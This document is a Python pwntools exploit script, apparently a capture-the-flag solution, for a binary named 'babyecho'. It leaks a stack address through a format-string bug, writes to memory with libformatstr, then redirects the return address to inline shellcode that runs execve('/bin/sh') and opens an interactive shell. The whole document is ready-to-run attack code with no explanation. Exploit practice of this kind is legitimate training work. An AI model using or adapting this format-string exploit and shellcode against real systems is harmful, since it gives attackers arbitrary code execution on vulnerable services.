from pwn import *
from libformatstr import FormatStr
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']

elf = './babyecho'
bin = ELF(elf)

local = 1

if local:
        cn = process(elf)
else:
        cn = remote('', )

#gdb.attach(elf, '''
#set follow-fork-mode child
#''')



offset_to_ret = 204
offset = 7
padding = 0
written = 0

pay = '%5$x'
cn.recv()
cn.sendline(pay)
addr_arg = cn.recv()
addr_arg = int(addr_arg[:7],16)-24
print hex(addr_arg)
s = FormatStr()
s[addr_arg]=1000
cn.sendline(s.payload(offset,padding,written))

cn.sendline(pay)
cn.recv()


addr_ret = addr_arg + offset_to_ret
shellcode =asm('\n'.join([
  'push %d' % u32('/sh\0'),  
  'push %d' % u32('/bin'),
  'mov ebx, esp' ,
  'xor ecx, ecx',
  'xor edx, edx', 
  'mov eax, 11',
  'int 0x80',
  ])) 
p = FormatStr()
p[addr_ret]=addr_arg+28

cn.sendline(p.payload(offset,padding,written)+shellcode)




cn.interactive()
